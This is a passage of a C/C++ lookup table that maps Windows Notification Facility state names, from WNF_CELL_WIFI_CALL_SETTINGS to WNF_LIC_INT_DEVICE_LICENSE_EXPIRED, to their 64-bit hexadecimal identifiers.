	{L"WNF_CELL_WIFI_CALL_SETTINGS_CAN0", 0xd8a0b2ea3beb075}, 
	{L"WNF_CELL_WIFI_CALL_SETTINGS_CAN1", 0xd8a0b2ea3beb875}, 
	{L"WNF_CERT_FLUSH_CACHE_STATE", 0x15940b2ea3bc1075}, 
	{L"WNF_CERT_FLUSH_CACHE_TRIGGER", 0x15940b2ea3bc0875}, 
	{L"WNF_CFCL_SC_CONFIGURATIONS_ADDED", 0xd85082ea3bc1875}, 
	{L"WNF_CFCL_SC_CONFIGURATIONS_CHANGED", 0xd85082ea3bc0875}, 
	{L"WNF_CFCL_SC_CONFIGURATIONS_DELETED", 0xd85082ea3bc1075}, 
	{L"WNF_CI_SMODE_CHANGE", 0x41c6072ea3bc0875}, 
	{L"WNF_CLIP_CLIPBOARD_HISTORY_ENABLED_CHANGED", 0x118f022ea3bc2035}, 
	{L"WNF_CLIP_CLIPBOARD_USERSVC_READY", 0x118f022ea3bc2835}, 
	{L"WNF_CLIP_CLIPBOARD_USERSVC_STOPPED", 0x118f022ea3bc3035}, 
	{L"WNF_CLIP_CONTENT_CHANGED", 0x118f022ea3bc0875}, 
	{L"WNF_CLIP_HISTORY_CHANGED", 0x118f022ea3bc1035}, 
	{L"WNF_CLIP_ROAMING_CLIPBOARD_ENABLED_CHANGED", 0x118f022ea3bc1835}, 
	{L"WNF_CNET_CELLULAR_CONNECTIONS_AVAILABLE", 0x1583002ea3bc4875}, 
	{L"WNF_CNET_DPU_GLOBAL_STATE_NOT_TRACKED", 0x1583002ea3bc3075}, 
	{L"WNF_CNET_DPU_GLOBAL_STATE_OFF_TRACK", 0x1583002ea3bc1875}, 
	{L"WNF_CNET_DPU_GLOBAL_STATE_ON_TRACK", 0x1583002ea3bc2075}, 
	{L"WNF_CNET_DPU_GLOBAL_STATE_OVER_LIMIT", 0x1583002ea3bc1075}, 
	{L"WNF_CNET_DPU_GLOBAL_STATE_UNDER_TRACK", 0x1583002ea3bc2875}, 
	{L"WNF_CNET_NON_CELLULAR_CONNECTED", 0x1583002ea3bc6875}, 
	{L"WNF_CNET_RADIO_ACTIVITY", 0x1583002ea3bc7875}, 
	{L"WNF_CNET_RADIO_ACTIVITY_OR_NON_CELLULAR_CONNECTED", 0x1583002ea3bc7075}, 
	{L"WNF_CNET_WIFI_ACTIVITY", 0x1583002ea3bc8075}, 
	{L"WNF_CONT_RESTORE_FROM_SNAPSHOT_COMPLETE", 0x1588012ea3bc0875}, 
	{L"WNF_CSC_SERVICE_START", 0x41851d2ea3bc0875}, 
	{L"WNF_CSHL_COMPOSER_CONTEXT_CHANGED", 0xd8e1d2ea3bc3835}, 
	{L"WNF_CSHL_COMPOSER_LAUNCH_READY", 0xd8e1d2ea3bc0835}, 
	{L"WNF_CSHL_COMPOSER_TEARDOWN", 0xd8e1d2ea3bc3035}, 
	{L"WNF_CSHL_PRODUCT_READY", 0xd8e1d2ea3bc2835}, 
	{L"WNF_CSHL_SKIP_OOBE_CXH", 0xd8e1d2ea3bc4035}, 
	{L"WNF_CSHL_UI_AUTOMATION", 0xd8e1d2ea3bc1035}, 
	{L"WNF_CSHL_VIEWHOSTING_READY", 0xd8e1d2ea3bc2035}, 
	{L"WNF_CSH_LAUNCH_EXPLORER_REQUESTED", 0x418e1d2ea3bc08f5}, 
	{L"WNF_CXH_APP_FINISHED", 0x418e162ea3bc1035}, 
	{L"WNF_CXH_BACK", 0x418e162ea3bc2035}, 
	{L"WNF_CXH_BACK_STATE", 0x418e162ea3bc1835}, 
	{L"WNF_CXH_OOBE_APP_READY", 0x418e162ea3bc2875}, 
	{L"WNF_CXH_WEBAPP_STATUS", 0x418e162ea3bc0835}, 
	{L"WNF_DBA_DEVICE_ACCESS_CHANGED", 0x41870c29a3bc0875}, 
	{L"WNF_DEP_OOBE_COMPLETE", 0x41960b29a3bc0c75}, 
	{L"WNF_DEP_UNINSTALL_DISABLED", 0x41960b29a3bc1475}, 
	{L"WNF_DEVM_DMWAPPUSHSVC_READY", 0xc900b29a3bc1875}, 
	{L"WNF_DEVM_MULTIVARIANT_PROVISIONING_SESSIONS", 0xc900b29a3bc3075}, 
	{L"WNF_DEVM_PROVISIONING_COMPLETE", 0xc900b29a3bc0875}, 
	{L"WNF_DICT_CONTENT_ADDED", 0x15850729a3bc0875}, 
	{L"WNF_DICT_PERSONALIZATION_FEEDBACK_SIGNAL", 0x15850729a3bc1075}, 
	{L"WNF_DISK_SCRUB_REQUIRED", 0xa950729a3bc0875}, 
	{L"WNF_DMF_MIGRATION_COMPLETE", 0x41800329a3bc1075}, 
	{L"WNF_DMF_MIGRATION_PROGRESS", 0x41800329a3bc1875}, 
	{L"WNF_DMF_MIGRATION_STARTED", 0x41800329a3bc0875}, 
	{L"WNF_DMF_UX_COMPLETE", 0x41800329a3bc2075}, 
	{L"WNF_DNS_ALL_SERVER_TIMEOUT", 0x41950029a3bc1075}, 
	{L"WNF_DO_MANAGER_ACTIVE", 0x41c60129a3bc0875}, 
	{L"WNF_DO_POLICY_CHANGED", 0x41c60129a3bc1075}, 
	{L"WNF_DSM_DSMAPPINSTALLED", 0x418b1d29a3bc0c75}, 
	{L"WNF_DSM_DSMAPPREMOVED", 0x418b1d29a3bc1475}, 
	{L"WNF_DUSM_IS_CELLULAR_BACKGROUND_RESTRICTED", 0xc951b29a3bc1075}, 
	{L"WNF_DUSM_TASK_TOAST", 0xc951b29a3bc0875}, 
	{L"WNF_DWM_COMPOSITIONCAPABILITIES", 0x418b1929a3bc2835}, 
	{L"WNF_DWM_HOLOGRAPHIC_COMPOSITOR_EXCLUSIVE", 0x418b1929a3bc3035}, 
	{L"WNF_DWM_HOLOGRAPHIC_COMPOSITOR_EXCLUSIVE_LOW_FRAMERATE", 0x418b1929a3bc1035}, 
	{L"WNF_DWM_HOLOGRAPHIC_COMPOSITOR_HAS_PROTECTED_CONTENT", 0x418b1929a3bc1835}, 
	{L"WNF_DWM_HOLOGRAPHIC_COMPOSITOR_LOW_FRAMERATE", 0x418b1929a3bc2035}, 
	{L"WNF_DWM_RUNNING", 0x418b1929a3bc0835}, 
	{L"WNF_DXGK_ADAPTER_TDR_NOTIFICATION", 0xa811629a3bc0875}, 
	{L"WNF_DXGK_PATH_FAILED_OR_INVALIDATED", 0xa811629a3bc1075}, 
	{L"WNF_DX_ADAPTER_START", 0x41c61629a3bc8075}, 
	{L"WNF_DX_ADAPTER_STOP", 0x41c61629a3bc8875}, 
	{L"WNF_DX_COLOR_OVERRIDE_STATE_CHANGE", 0x41c61629a3bc9875}, 
	{L"WNF_DX_COLOR_PROFILE_CHANGE", 0x41c61629a3bc7035}, 
	{L"WNF_DX_DEVICE_REMOVAL", 0x41c61629a3bc60b5}, 
	{L"WNF_DX_DISPLAY_COLORIMETRY_DATA_CHANGED", 0x41c61629a3bca075}, 
	{L"WNF_DX_DISPLAY_CONFIG_CHANGE_NOTIFICATION", 0x41c61629a3bc5835}, 
	{L"WNF_DX_GPM_TARGET", 0x41c61629a3bc7875}, 
	{L"WNF_DX_HARDWARE_CONTENT_PROTECTION_TILT_NOTIFICATION", 0x41c61629a3bc4075}, 
	{L"WNF_DX_INTERNAL_PANEL_DIMENSIONS", 0x41c61629a3bc4875}, 
	{L"WNF_DX_MODERN_OUTPUTDUPLICATION", 0x41c61629a3bc5035}, 
	{L"WNF_DX_MODERN_OUTPUTDUPLICATION_CONTEXTS", 0x41c61629a3bc6835}, 
	{L"WNF_DX_MODE_CHANGE_NOTIFICATION", 0x41c61629a3bc1035}, 
	{L"WNF_DX_MONITOR_CHANGE_NOTIFICATION", 0x41c61629a3bc2835}, 
	{L"WNF_DX_NETWORK_DISPLAY_STATE_CHANGE_NOTIFICATION", 0x41c61629a3bc2035}, 
	{L"WNF_DX_OCCLUSION_CHANGE_NOTIFICATION", 0x41c61629a3bc1835}, 
	{L"WNF_DX_SDR_WHITE_LEVEL_CHANGED", 0x41c61629a3bc9035}, 
	{L"WNF_DX_STEREO_CONFIG", 0x41c61629a3bc0c75}, 
	{L"WNF_DX_VAIL_CHANGE_NOTIFICATION", 0x41c61629a3bca8b5}, 
	{L"WNF_DX_VIDMM_BUDGETCHANGE_NOTIFICATION", 0x41c61629a3bc3875}, 
	{L"WNF_DX_VIDMM_TRIM_NOTIFICATION", 0x41c61629a3bc30b5}, 
	{L"WNF_EAP_APPLICATION_HANDLE", 0x41960f28a3bc0875}, 
	{L"WNF_EDGE_EXTENSION_AVAILABLE", 0x4810a28a3bc18f5}, 
	{L"WNF_EDGE_EXTENSION_INSTALLED", 0x4810a28a3bc10f5}, 
	{L"WNF_EDGE_INPRIVATE_EXTENSION_AVAILABLE", 0x4810a28a3bc20f5}, 
	{L"WNF_EDGE_LAST_NAVIGATED_HOST", 0x4810a28a3bc08f5}, 
	{L"WNF_EDP_AAD_REAUTH_REQUIRED", 0x41960a28a3bc3875}, 
	{L"WNF_EDP_APP_UI_ENTERPRISE_CONTEXT_CHANGED", 0x41960a28a3bc3035}, 
	{L"WNF_EDP_CLIPBOARD_METADATA_CHANGED", 0x41960a28a3bc2035}, 
	{L"WNF_EDP_CREDENTIALS_UPDATING", 0x41960a28a3bc7075}, 
	{L"WNF_EDP_DIALOG_CANCEL", 0x41960a28a3bc2835}, 
	{L"WNF_EDP_DPL_KEYS_DROPPING", 0x41960a28a3bc5875}, 
	{L"WNF_EDP_DPL_KEYS_STATE", 0x41960a28a3bc1875}, 
	{L"WNF_EDP_ENTERPRISE_CONTEXTS_UPDATED", 0x41960a28a3bc4475}, 
	{L"WNF_EDP_IDENTITY_REVOKED", 0x41960a28a3bc10f5}, 
	{L"WNF_EDP_MISSING_CREDENTIALS", 0x41960a28a3bc6075}, 
	{L"WNF_EDP_PROCESS_TLS_INDEX", 0x41960a28a3bc50b5}, 
	{L"WNF_EDP_PROCESS_UI_ENFORCEMENT", 0x41960a28a3bc4875}, 
	{L"WNF_EDP_PURGE_APP_LEARNING_EVT", 0x41960a28a3bc6875}, 
	{L"WNF_EDP_TAGGED_APP_LAUNCHED", 0x41960a28a3bc0835}, 
	{L"WNF_EDU_PRINTER_POLICY_CHANGED", 0x41930a28a3bc0875}, 
	{L"WNF_EFS_SERVICE_START", 0x41950828a3bc0875}, 
	{L"WNF_EFS_SOFTWARE_HIVE_AVAILABLE", 0x41950828a3bc1075}, 
	{L"WNF_ENTR_ABOVELOCK_POLICY_VALUE_CHANGED", 0x13920028a3bc7875}, 
	{L"WNF_ENTR_ACCOUNTS_POLICY_VALUE_CHANGED", 0x13920028a3bc3075}, 
	{L"WNF_ENTR_ALLOWALLTRUSTEDAPPS_POLICY_VALUE_CHANGED", 0x13920028a3bcf875}, 
	{L"WNF_ENTR_ALLOWAPPLICATIONS_POLICY_VALUE_CHANGED", 0x13920028a3bc8075}, 
	{L"WNF_ENTR_ALLOWCELLULARDATAROAMING_POLICY_VALUE_CHANGED", 0x13920028a3bd4875}, 
	{L"WNF_ENTR_ALLOWCELLULARDATA_POLICY_VALUE_CHANGED", 0x13920028a3bd5075}, 
	{L"WNF_ENTR_ALLOWDEVELOPERUNLOCK_POLICY_VALUE_CHANGED", 0x13920028a3bd1875}, 
	{L"WNF_ENTR_ALLOWDEVICEHEALTHMONITORING_POLICY_VALUE_CHANGED", 0x13920028a3bda075}, 
	{L"WNF_ENTR_ALLOWINPUTPANEL_POLICY_VALUE_CHANGED", 0x13920028a3bca875}, 
	{L"WNF_ENTR_ALLOWMANUALWIFICONFIGURATION_POLICY_VALUE_CHANGED", 0x13920028a3bdb875}, 
	{L"WNF_ENTR_ALLOWMESSAGESYNC_POLICY_VALUE_CHANGED", 0x13920028a3bd6875}, 
	{L"WNF_ENTR_ALLOWMESSAGE_MMS_POLICY_VALUE_CHANGED", 0x13920028a3bdd875}, 
	{L"WNF_ENTR_ALLOWMESSAGE_RCS_POLICY_VALUE_CHANGED", 0x13920028a3bde075}, 
	{L"WNF_ENTR_ALLOWNONMICROSOFTSIGNEDUPDATE_POLICY_VALUE_CHANGED", 0x13920028a3bd3075}, 
	{L"WNF_ENTR_ALLOWPROJECTIONFROMPC_POLICY_VALUE_CHANGED", 0x13920028a3be0075}, 
	{L"WNF_ENTR_ALLOWPROJECTIONTOPC_POLICY_VALUE_CHANGED", 0x13920028a3bdd075}, 
	{L"WNF_ENTR_ALLOWSET24HOURCLOCK_POLICY_VALUE_CHANGED", 0x13920028a3bdf875}, 
	{L"WNF_ENTR_ALLOWSHAREDUSERDATA_POLICY_VALUE_CHANGED", 0x13920028a3bd0075}, 
	{L"WNF_ENTR_ALLOWUPDATESERVICE_POLICY_VALUE_CHANGED", 0x13920028a3bd2075}, 
	{L"WNF_ENTR_ALLOWWIFIDIRECT_POLICY_VALUE_CHANGED", 0x13920028a3bdc875}, 
	{L"WNF_ENTR_ALLOWWIFI_POLICY_VALUE_CHANGED", 0x13920028a3bdb075}, 
	{L"WNF_ENTR_ALLOW_WBA_EXECUTION_POLICY_VALUE_CHANGED", 0x13920028a3bd3875}, 
	{L"WNF_ENTR_APPHVSI_CACHED_POLICY_VALUE_CHANGED", 0x13920028a3bd8475}, 
	{L"WNF_ENTR_APPHVSI_POLICY_VALUE_CHANGED", 0x13920028a3bdf075}, 
	{L"WNF_ENTR_APPLICATIONMANAGEMENT_POLICY_VALUE_CHANGED", 0x13920028a3bc5875}, 
	{L"WNF_ENTR_APPPRIVACY_POLICY_VALUE_CHANGED", 0x13920028a3be1875}, 
	{L"WNF_ENTR_BITS_POLICY_VALUE_CHANGED", 0x13920028a3be6875}, 
	{L"WNF_ENTR_BLUETOOTH_POLICY_VALUE_CHANGED", 0x13920028a3bcd875}, 
	{L"WNF_ENTR_BROWSER_POLICY_VALUE_CHANGED", 0x13920028a3bc4075}, 
	{L"WNF_ENTR_CAMERA_POLICY_VALUE_CHANGED", 0x13920028a3bc5075}, 
	{L"WNF_ENTR_CONNECTIVITY_POLICY_VALUE_CHANGED", 0x13920028a3bc2075}, 
	{L"WNF_ENTR_CONTEXT_STATE_CHANGE", 0x13920028a3bc9875}, 
	{L"WNF_ENTR_DEVICELOCK_POLICY_VALUE_CHANGED", 0x13920028a3bc0875}, 
	{L"WNF_ENTR_DISABLEADVERTISINGID_POLICY_VALUE_CHANGED", 0x13920028a3bd7075}, 
	{L"WNF_ENTR_DOMAIN_NAMES_FOR_EMAIL_SYNC_POLICY_VALUE_CHANGED", 0x13920028a3bd4075}, 
	{L"WNF_ENTR_EDPENFORCEMENTLEVEL_CACHED_POLICY_VALUE_CHANGED", 0x13920028a3bd5c75}, 
	{L"WNF_ENTR_EDPENFORCEMENTLEVEL_POLICY_VALUE_CHANGED", 0x13920028a3bc8875}, 
	{L"WNF_ENTR_EDPNETWORKING_POLICY_VALUE_CHANGED", 0x13920028a3bce075}, 
	{L"WNF_ENTR_EDPSHOWICONS_CACHED_POLICY_VALUE_CHANGED", 0x13920028a3bd9c75}, 
	{L"WNF_ENTR_EDPSMB_POLICY_VALUE_CHANGED", 0x13920028a3bde875}, 
	{L"WNF_ENTR_EMOJI_AVAILABILITY_POLICY_VALUE_CHANGED", 0x13920028a3be5075}, 
	{L"WNF_ENTR_ENABLETOUCHKEYBOARDAUTOINVOKE_POLICY_VALUE_CHANGED", 0x13920028a3be2075}, 
	{L"WNF_ENTR_EVALUATE_APPHVSI_CONFIGURATION_STATE", 0x13920028a3bd9075}, 
	{L"WNF_ENTR_EVALUATE_EDP_CONFIGURATION_STATE", 0x13920028a3bd7875}, 
	{L"WNF_ENTR_EXPERIENCE_POLICY_VALUE_CHANGED", 0x13920028a3bc2875}, 
	{L"WNF_ENTR_EXPLOITGUARD_POLICY_VALUE_CHANGED", 0x13920028a3be0875}, 
	{L"WNF_ENTR_FORCEDOCKED_TOUCHKEYBOARD_POLICY_VALUE_CHANGED", 0x13920028a3be5875}, 
	{L"WNF_ENTR_FULLLAYOUT_AVAILABILITY_POLICY_VALUE_CHANGED", 0x13920028a3be2875}, 
	{L"WNF_ENTR_HANDWRITING_AVAILABILITY_POLICY_VALUE_CHANGED", 0x13920028a3be4075}, 
	{L"WNF_ENTR_NARROWLAYOUT_AVAILABILITY_POLICY_VALUE_CHANGED", 0x13920028a3be3875}, 
	{L"WNF_ENTR_NETWORKISOLATION_POLICY_VALUE_CHANGED", 0x13920028a3bd8875}, 
	{L"WNF_ENTR_PROTECTEDDOMAINNAMES_CACHED_POLICY_VALUE_CHANGED", 0x13920028a3bd6475}, 
	{L"WNF_ENTR_PUSH_NOTIFICATION_RECEIVED", 0x13920028a3bc6875}, 
	{L"WNF_ENTR_PUSH_RECEIVED", 0x13920028a3bca075}, 
	{L"WNF_ENTR_REMOVABLEDISK_DENY_WRITE_POLICY_VALUE_CHANGED", 0x13920028a3be7075}, 
	{L"WNF_ENTR_REQUIRE_DEVICE_ENCRYPTION_POLICY_VALUE_CHANGED", 0x13920028a3bc6075}, 
	{L"WNF_ENTR_REQUIRE_DPL_POLICY_VALUE_CHANGED", 0x13920028a3bce875}, 
	{L"WNF_ENTR_RESTRICTAPPDATATOSYTEMVOLUME_POLICY_VALUE_CHANGED", 0x13920028a3bd1075}, 
	{L"WNF_ENTR_RESTRICTAPPTOSYTEMVOLUME_POLICY_VALUE_CHANGED", 0x13920028a3bd0875}, 
	{L"WNF_ENTR_SEARCH_ALLOW_INDEXER", 0x13920028a3bdc075}, 
	{L"WNF_ENTR_SEARCH_ALLOW_INDEXING_ENCRYPTED_STORES_OR_ITEMS", 0x13920028a3bcd075}, 
	{L"WNF_ENTR_SEARCH_ALLOW_USING_DIACRITICS", 0x13920028a3bcb075}, 
	{L"WNF_ENTR_SEARCH_ALWAYS_USE_AUTO_LANG_DETECTION", 0x13920028a3bcb875}, 
	{L"WNF_ENTR_SEARCH_DISABLE_REMOVABLE_DRIVE_INDEXING", 0x13920028a3bcc075}, 
	{L"WNF_ENTR_SEARCH_POLICY_VALUE_CHANGED", 0x13920028a3bc7075}, 
	{L"WNF_ENTR_SEARCH_PREVENT_INDEXING_LOW_DISK_SPACE_MB", 0x13920028a3bcc875}, 
	{L"WNF_ENTR_SECURITY_POLICY_VALUE_CHANGED", 0x13920028a3bc3875}, 
	{L"WNF_ENTR_SPLITLAYOUT_AVAILABILITY_POLICY_VALUE_CHANGED", 0x13920028a3be4875}, 
	{L"WNF_ENTR_SYSTEM_POLICY_VALUE_CHANGED", 0x13920028a3bc1875}, 
	{L"WNF_ENTR_TOUCHKEYBOARDDICTATION_POLICY_VALUE_CHANGED", 0x13920028a3be6075}, 
	{L"WNF_ENTR_UPDATESERVICEURL_POLICY_VALUE_CHANGED", 0x13920028a3bd2875}, 
	{L"WNF_ENTR_UPDATE_POLICY_VALUE_CHANGED", 0x13920028a3bc4875}, 
	{L"WNF_ENTR_WAP_MESSAGE_FOR_DMWAPPUSHSVC_READY", 0x13920028a3bc9075}, 
	{L"WNF_ENTR_WIDELAYOUT_AVAILABILITY_POLICY_VALUE_CHANGED", 0x13920028a3be3075}, 
	{L"WNF_ENTR_WIFI_POLICY_VALUE_CHANGED", 0x13920028a3bc1075}, 
	{L"WNF_ENTR_WINDOWSDEFENDERSECURITYCENTER_POLICY_VALUE_CHANGED", 0x13920028a3be1075}, 
	{L"WNF_ENTR_WINDOWS_DEFENDER_POLICY_VALUE_CHANGED", 0x13920028a3bcf075}, 
	{L"WNF_EOA_ATMANAGER_ATS_STARTED", 0x41870128a3bc2035}, 
	{L"WNF_EOA_NARRATOR_FOCUS_CHANGE", 0x41870128a3bc08f5}, 
	{L"WNF_EOA_NARRATOR_KEYBOARD_REMAP", 0x41870128a3bc2875}, 
	{L"WNF_EOA_NARRATOR_RUNNING", 0x41870128a3bc1075}, 
	{L"WNF_EOA_UISETTINGS_CHANGED", 0x41870128a3bc1875}, 
	{L"WNF_ETW_SUBSYSTEM_INITIALIZED", 0x41911a28a3bc0875}, 
	{L"WNF_EXEC_OSTASKCOMPLETION_REVOKED", 0x2831628a3bc0875}, 
	{L"WNF_EXEC_THERMAL_LIMITER_CLOSE_APPLICATION_VIEWS", 0x2831628a3bc1875}, 
	{L"WNF_EXEC_THERMAL_LIMITER_DISPLAY_WARNING", 0x2831628a3bc2875}, 
	{L"WNF_EXEC_THERMAL_LIMITER_STOP_MRC", 0x2831628a3bc3075}, 
	{L"WNF_EXEC_THERMAL_LIMITER_TERMINATE_BACKGROUND_TASKS", 0x2831628a3bc2075}, 
	{L"WNF_FDBK_QUESTION_NOTIFICATION", 0xa840a2ba3bc0875}, 
	{L"WNF_FLTN_WNF_ARRIVED", 0xf92022ba3bc0875}, 
	{L"WNF_FLT_RUNDOWN_WAIT", 0x4192022ba3bc0875}, 
	{L"WNF_FLYT_IDS_CHANGED", 0x159f022ba3bc0875}, 
	{L"WNF_FOD_STATE_CHANGE", 0x4182012ba3bc0875}, 
	{L"WNF_FSRL_OPLOCK_BREAK", 0xd941d2ba3bc1075}, 
	{L"WNF_FSRL_TIERED_VOLUME_DETECTED", 0xd941d2ba3bc0875}, 
	{L"WNF_FVE_BDESVC_TRIGGER_START", 0x4183182ba3bc3075}, 
	{L"WNF_FVE_BITLOCKER_ENCRYPT_ALL_DRIVES", 0x4183182ba3bc6875}, 
	{L"WNF_FVE_DETASK_SYNC_PROVISIONING_COMPLETE", 0x4183182ba3bc7075}, 
	{L"WNF_FVE_DETASK_TRIGGER_START", 0x4183182ba3bc6075}, 
	{L"WNF_FVE_DE_MANAGED_VOLUMES_COUNT", 0x4183182ba3bc1075}, 
	{L"WNF_FVE_DE_SUPPORT", 0x4183182ba3bc0875}, 
	{L"WNF_FVE_MDM_POLICY_REFRESH", 0x4183182ba3bc4075}, 
	{L"WNF_FVE_REQUIRE_SDCARD_ENCRYPTION", 0x4183182ba3bc4875}, 
	{L"WNF_FVE_SDCARD_ENCRYPTION_REQUEST", 0x4183182ba3bc5075}, 
	{L"WNF_FVE_SDCARD_ENCRYPTION_STATUS", 0x4183182ba3bc5875}, 
	{L"WNF_FVE_STATE_CHANGE", 0x4183182ba3bc3875}, 
	{L"WNF_FVE_WIM_HASH_DELETION_TRIGGER", 0x4183182ba3bc2875}, 
	{L"WNF_FVE_WIM_HASH_GENERATION_COMPLETION", 0x4183182ba3bc2075}, 
	{L"WNF_FVE_WIM_HASH_GENERATION_TRIGGER", 0x4183182ba3bc1875}, 
	{L"WNF_GC_INITIAL_PRESENT", 0x41c60d2aa3bc0875}, 
	{L"WNF_GIP_ADAPTER_CHANGE", 0x4196072aa3bc0875}, 
	{L"WNF_GLOB_USERPROFILE_LANGLIST_CHANGED", 0x389022aa3bc0875}, 
	{L"WNF_GPOL_SYSTEM_CHANGES", 0xd891e2aa3bc0875}, 
	{L"WNF_GPOL_USER_CHANGES", 0xd891e2aa3bc10f5}, 
	{L"WNF_HAM_SYSTEM_STATE_CHANGED", 0x418b0f25a3bc0875}, 
	{L"WNF_HAS_VERIFY_HEALTH_CERT", 0x41950f25a3bc0875}, 
	{L"WNF_HOLO_CAPTURE_STATE", 0xe8a0125a3bcc035}, 
	{L"WNF_HOLO_DISPLAY_QUALITY_LEVEL", 0xe8a0125a3bc7835}, 
	{L"WNF_HOLO_ENVIRONMENT_AUDIO_ASSET", 0xe8a0125a3bc5075}, 
	{L"WNF_HOLO_FORCE_ROOM_BOUNDARY", 0xe8a0125a3bc2835}, 
	{L"WNF_HOLO_INPUT_FOCUS_CHANGE", 0xe8a0125a3bc2075}, 
	{L"WNF_HOLO_PROJECTION_REQUEST", 0xe8a0125a3bcb835}, 
	{L"WNF_HOLO_REQUEST_HMD_USE_STATE", 0xe8a0125a3bc9035}, 
	{L"WNF_HOLO_REQUEST_HOLOGRAPHIC_ACTIVATION_REALM", 0xe8a0125a3bc9835}, 
	{L"WNF_HOLO_RESET_IDLE_TIMER", 0xe8a0125a3bca035}, 
	{L"WNF_HOLO_RETAIL_DEMO_TIMER", 0xe8a0125a3bc7035}, 
	{L"WNF_HOLO_ROOM_BOUNDARY_DATA_CHANGED", 0xe8a0125a3bc3835}, 
	{L"WNF_HOLO_ROOM_BOUNDARY_VISIBILITY", 0xe8a0125a3bc4035}, 
	{L"WNF_HOLO_SET_SHELL_SPAWN_POINT", 0xe8a0125a3bc6835}, 
	{L"WNF_HOLO_SHARING_SESSION_CONTEXT", 0xe8a0125a3bcb035}, 
	{L"WNF_HOLO_SHELL_INPUT_3DSWITCH_DISABLE", 0xe8a0125a3bc4835}, 
	{L"WNF_HOLO_SHELL_STATE", 0xe8a0125a3bc1835}, 
	{L"WNF_HOLO_SHELL_STATE_INTERACTIVE_USER", 0xe8a0125a3bca875}, 
	{L"WNF_HOLO_STREAMING_STATE", 0xe8a0125a3bc3035}, 
	{L"WNF_HOLO_SYSTEM_DISPLAY_CONTEXT_CHANGE", 0xe8a0125a3bc8875}, 
	{L"WNF_HOLO_UNINSTALL_COMPLETE", 0xe8a0125a3bc6075}, 
	{L"WNF_HOLO_UNINSTALL_PREPARE", 0xe8a0125a3bc5875}, 
	{L"WNF_HOLO_UNINSTALL_PREPARE_COMPLETE", 0xe8a0125a3bc8075}, 
	{L"WNF_HOLO_USER_DISPLAY_CONTEXT", 0xe8a0125a3bc0835}, 
	{L"WNF_HOLO_USER_INPUT_CONTEXT", 0xe8a0125a3bc1035}, 
	{L"WNF_HVL_CPU_MGMT_PARTITION", 0x418a1825a3bc0875}, 
	{L"WNF_HYPV_HOST_WMI_EVENT_PROVIDER_STATE", 0x17961725a3bc1075}, 
	{L"WNF_HYPV_HOST_WMI_OBJECT_PROVIDER_STATE", 0x17961725a3bc0875}, 
	{L"WNF_IME_AUTOMATIC_PRIVATE_MODE", 0x41830324a3bc1835}, 
	{L"WNF_IME_EXPLICIT_PRIVATE_MODE", 0x41830324a3bc1035}, 
	{L"WNF_IME_INPUT_MODE_LABEL", 0x41830324a3bc0875}, 
	{L"WNF_IME_INPUT_SWITCH_NOTIFY", 0x41830324a3bc2035}, 
	{L"WNF_IMSN_GLOBALLIGHTSINVALIDATED", 0xf950324a3bc4835}, 
	{L"WNF_IMSN_IMMERSIVEMONITORCHANGED", 0xf950324a3bc1835}, 
	{L"WNF_IMSN_KILL_LOGICAL_FOCUS", 0xf950324a3bc3035}, 
	{L"WNF_IMSN_LAUNCHERVISIBILITY", 0xf950324a3bc1035}, 
	{L"WNF_IMSN_MONITORMODECHANGED", 0xf950324a3bc0835}, 
	{L"WNF_IMSN_PROJECTIONDISPLAYAVAILABLE", 0xf950324a3bc3835}, 
	{L"WNF_IMSN_TRANSPARENCYPOLICY", 0xf950324a3bc4035}, 
	{L"WNF_IMS_PUSH_NOTIFICATION_RECEIVED", 0x41950324a3bc0875}, 
	{L"WNF_IOT_EMBEDDED_MODE_POLICY_VALUE_CHANGED", 0x41920124a3bc0875}, 
	{L"WNF_IOT_STARTUP_SETTINGS_CHANGED", 0x41920124a3bc1075}, 
	{L"WNF_ISM_CURSOR_MANAGER_READY", 0x418b1d24a3bc1835}, 
	{L"WNF_ISM_GAMECONTROLLER_ZEPHYRUS_FAULT", 0x418b1d24a3bc2075}, 
	{L"WNF_ISM_INPUT_UPDATE_AFTER_TRACK_INTERVAL", 0x418b1d24a3bc1035}, 
	{L"WNF_ISM_LAST_USER_ACTIVITY", 0x418b1d24a3bc0835}, 
	{L"WNF_IUIS_SCALE_CHANGED", 0x128f1b24a3bc0835}, 
	{L"WNF_KSV_CAMERAPRIVACY", 0x41901d26a3bc2875}, 
	{L"WNF_KSV_DEVICESTATE", 0x41901d26a3bc1075}, 
	{L"WNF_KSV_FSSTREAMACTIVITY", 0x41901d26a3bc1875}, 
	{L"WNF_KSV_KSSTREAMACTIVITY", 0x41901d26a3bc2075}, 
	{L"WNF_KSV_STREAMSTATE", 0x41901d26a3bc0875}, 
	{L"WNF_LANG_FOD_INSTALLATION_STARTED", 0x6880f21a3bc0875}, 
	{L"WNF_LED_SETTINGSCHANGED", 0x41820b21a3bc0875}, 
	{L"WNF_LFS_ACTION_DIALOG_AVAILABLE", 0x41950821a3bc4875}, 
	{L"WNF_LFS_CLIENT_RECALCULATE_PERMISSIONS", 0x41950821a3bc3875}, 
	{L"WNF_LFS_GEOFENCETRACKING_STATE", 0x41950821a3bc2075}, 
	{L"WNF_LFS_LOCATION_MDM_AREA_POLICY_CHANGED", 0x41950821a3bc6075}, 
	{L"WNF_LFS_LOCATION_MDM_POLICY_ENABLELOCATION_CHANGED", 0x41950821a3bc6875}, 
	{L"WNF_LFS_MASTERSWITCH_STATE", 0x41950821a3bc1875}, 
	{L"WNF_LFS_PERMISSION_TO_SHOW_ICON_CHANGED", 0x41950821a3bc4075}, 
	{L"WNF_LFS_POSITION_AVAILABLE", 0x41950821a3bc3075}, 
	{L"WNF_LFS_RESERVED_WNF_EVENT_2", 0x41950821a3bc2875}, 
	{L"WNF_LFS_RUNNING_STATE", 0x41950821a3bc1075}, 
	{L"WNF_LFS_SIGNIFICANT_LOCATION_EVENT", 0x41950821a3bc5075}, 
	{L"WNF_LFS_STATE", 0x41950821a3bc0875}, 
	{L"WNF_LFS_VISITS_SIGNIFICANT_LOCATION_EVENT", 0x41950821a3bc5875}, 
	{L"WNF_LIC_DEVICE_LICENSE_MISSING", 0x41850721a3bc3075}, 
	{L"WNF_LIC_DEVICE_LICENSE_REMOVED", 0x41850721a3bc2875}, 
	{L"WNF_LIC_DEVICE_LICENSE_UPDATED", 0x41850721a3bc2075}, 
	{L"WNF_LIC_HARDWAREID_IN_DEVICE_LICENSE_IN_TOLERANCE", 0x41850721a3bc1875}, 
	{L"WNF_LIC_HARDWAREID_IN_DEVICE_LICENSE_OUT_OF_TOLERANCE", 0x41850721a3bc1075}, 
	{L"WNF_LIC_INT_DEVICE_LICENSE_EXPIRED", 0x41850721a3bc3875}, 
